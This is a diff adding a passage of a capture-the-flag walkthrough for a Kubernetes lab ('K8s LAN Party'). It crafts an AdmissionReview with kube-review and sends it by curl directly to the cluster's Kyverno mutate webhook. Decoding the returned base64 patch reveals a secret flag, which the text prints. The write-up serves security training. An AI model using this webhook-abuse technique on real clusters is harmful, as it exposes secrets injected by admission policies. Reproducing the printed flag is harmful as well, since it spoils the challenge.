@@ -909,6 +909,10 @@ player@wiz-k8s-lan-party:~$
 
 ---
 
+
+
+
+
 ---
 
 ---
@@ -1012,7 +1016,112 @@ locally and execute the following command:
 
 ---
 
+```bash
+./kube-review-darwin-amd64 create pod.yaml 
+{
+  "kind": "AdmissionReview",
+  "apiVersion": "admission.k8s.io/v1",
+  "request": {
+    "uid": "2bc53680-348b-4c6b-a86f-1d90d72f0e57",
+    "kind": {
+      "group": "",
+      "version": "v1",
+      "kind": "Pod"
+    },
+    "resource": {
+      "group": "",
+      "version": "v1",
+      "resource": "pods"
+    },
+    "requestKind": {
+      "group": "",
+      "version": "v1",
+      "kind": "Pod"
+    },
+    "requestResource": {
+      "group": "",
+      "version": "v1",
+      "resource": "pods"
+    },
+    "name": "sensitive-pod",
+    "namespace": "sensitive-ns",
+    "operation": "CREATE",
+    "userInfo": {
+      "username": "kube-review",
+      "uid": "363baef8-53a8-4ed6-8d2c-40cd95673f68"
+    },
+    "object": {
+      "kind": "Pod",
+      "apiVersion": "v1",
+      "metadata": {
+        "name": "sensitive-pod",
+        "namespace": "sensitive-ns",
+        "creationTimestamp": null
+      },
+      "spec": {
+        "containers": [
+          {
+            "name": "nginx",
+            "image": "nginx:latest",
+            "resources": {}
+          }
+        ]
+      },
+      "status": {}
+    },
+    "oldObject": null,
+    "dryRun": true,
+    "options": {
+      "kind": "CreateOptions",
+      "apiVersion": "meta.k8s.io/v1"
+    }
+  }
+}
 
+```
+
+Store the file in a pod.json file after transferring it to the shell.  After the file has been moved, send Kyverno an admission request using the command below. This will cause a mutation webhook to be triggered and build a pod with the environment variable injected.
+
+
+### curl request:
+
+
+```curl -X POST -H "Content-Type: application/json" --data @pod.json https://kyverno-svc.kyverno/mutate -k```
+
+
+
+```bash
+player@wiz-k8s-lan-party:~$ nano pod.json
+player@wiz-k8s-lan-party:~$ ls
+kube-review-darwin-amd64.zip  pod.json  pod.yaml
+player@wiz-k8s-lan-party:~$ curl -X POST -H "Content-Type: application/json" --data @pod.json https://kyverno-svc.kyverno/mutate -k
+{"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1","request":{"uid":"2bc53680-348b-4c6b-a86f-1d90d72f0e57","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"requestKind":{"group":"","version":"v1","kind":"Pod"},"requestResource":{"group":"","version":"v1","resource":"pods"},"name":"sensitive-pod","namespace":"sensitive-ns","operation":"CREATE","userInfo":{"username":"kube-review","uid":"363baef8-53a8-4ed6-8d2c-40cd95673f68"},"object":{"kind":"Pod","apiVersion":"v1","metadata":{"name":"sensitive-pod","namespace":"sensitive-ns","creationTimestamp":null},"spec":{"containers":[{"name":"nginx","image":"nginx:latest","resources":{}}]},"status":{}},"oldObject":null,"dryRun":true,"options":{"kind":"CreateOptions","apiVersion":"meta.k8s.io/v1"}},"response":{"uid":"2bc53680-348b-4c6b-a86f-1d90d72f0e57","allowed":true,"patch":"W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d","patchType":"JSONPatch"}}player@wiz-k8s-lan-party:~$ 
+player@wiz-k8s-lan-party:~$ echo "W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d" | base64 -d | jq
+[
+  {
+    "op": "add",
+    "path": "/spec/containers/0/env",
+    "value": [
+      {
+        "name": "FLAG",
+        "value": "wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}"
+      }
+    ]
+  },
+  {
+    "path": "/metadata/annotations",
+    "op": "add",
+    "value": {
+      "policies.kyverno.io/last-applied-patches": "inject-env-vars.apply-flag-to-env.kyverno.io: added /spec/containers/0/env\n"
+    }
+  }
+]
+player@wiz-k8s-lan-party:~$
+```
+
+---
+
+---
 
 
 
